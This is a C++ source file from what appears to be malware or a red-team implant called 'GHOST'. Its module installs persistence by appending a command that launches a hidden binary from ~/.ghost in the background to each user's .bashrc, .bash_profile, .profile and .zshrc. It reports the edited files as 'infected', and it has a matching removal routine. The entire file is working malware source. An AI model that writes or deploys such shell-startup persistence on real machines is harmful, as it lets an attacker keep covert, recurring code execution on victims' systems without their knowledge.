#include "modules/persistence/RunControl.hpp"
#include "utils/Logger.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"
#include <filesystem>

// TODO: add one-and-done option -> one successful rc persistence and return
// TODO: track all files where persistence was established and remove only from them (less noisy than iterating over all again)

bool RunControlMethod::install() {
    const std::vector<std::string> RC_TARGETS = {
        #ifdef DEBUG_MODE
        ".test"
        #else
        ".bashrc",
        ".bash_profile",
        ".profile",
        ".zshrc"
        #endif
    };
    const std::string payload = "~/.ghost/GHOST &"; // TODO: make payloads parametrizable? (maybe even per file/file type)

    std::string home(SystemUtils::GetUserHome());
    int successCount = 0;

    LOG_INFO("Attempting RunControl persistence")

    for (const auto& target : RC_TARGETS) {
        std::string path = home + "/" + target;

        if (!std::filesystem::exists(path)) {
            LOG_INFO("Skipping {} (file not found)", path)
            continue;
        }

        LOG_INFO("Attempting persistence on {}", path)
        if (FileUtils::AppendToFile(path, payload)) {
            LOG_SUCCESS("Persistence established in {}", path)
            successCount++;
        } else {
            LOG_ERROR("Error appending payload {} to file {}", payload, target)
        }
    }

    if (successCount > 0) {
        LOG_SUCCESS("[SUMMARY] Infected {} rc files", successCount)
    } else {
        LOG_ERROR("[SUMMARY] Failed to infect any rc files")
    }

    return successCount > 0;
}

bool RunControlMethod::remove() {
    const std::vector<std::string> RC_TARGETS = {
        #ifdef DEBUG_MODE
        ".test"
        #else
        ".bashrc",
        ".bash_profile",
        ".profile",
        ".zshrc"
        #endif
    };
    const std::string payload = "~/.ghost/GHOST &"; // TODO: make payloads parametrizable? (maybe even per file/file type)

    std::string home(SystemUtils::GetUserHome());
    int successCount = 0;

    LOG_INFO("Removing RunControl persistence")

    for (const auto& target : RC_TARGETS) {
        std::string path = home + "/" + target;

        if (!std::filesystem::exists(path)) {
            LOG_INFO("Skipping {} (file not found)", path)
            continue;
        }

        LOG_INFO("Attempting to remove persistence from {}", path)
        if (FileUtils::RemoveFromFile(path, payload)) {
            LOG_SUCCESS("Persistence removed from {}", path)
            successCount++;
        } else {
            LOG_ERROR("Error removing payload {} from file {}", payload, target)
        }
    }

    if (successCount > 0) {
        LOG_SUCCESS("[SUMMARY] Restored {} rc files", successCount)
    } else {
        LOG_ERROR("[SUMMARY] Failed to restore any rc files")
    }

    return !(successCount > 0); // TODO: when TODO in lines 5-6 is implemented, return successCount == infectedCount or smth like this
}